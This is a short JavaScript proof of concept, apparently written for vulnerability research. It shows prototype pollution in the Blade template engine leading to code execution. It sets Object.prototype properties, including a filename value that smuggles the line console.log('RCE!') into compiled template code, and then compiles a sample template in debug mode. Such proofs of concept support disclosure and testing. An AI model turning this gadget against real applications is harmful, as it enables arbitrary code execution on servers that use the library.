const blade = require('blade');

/**
 * prototype pollution
 */

Object.prototype.filename = "xxx\nconsole.log('RCE!')\n"
Object.prototype.text = "x"
Object.prototype.name = "x"
Object.prototype.x = "text"

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;

blade.compile(template, {'debug': true}, function(err, tmpl) {
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});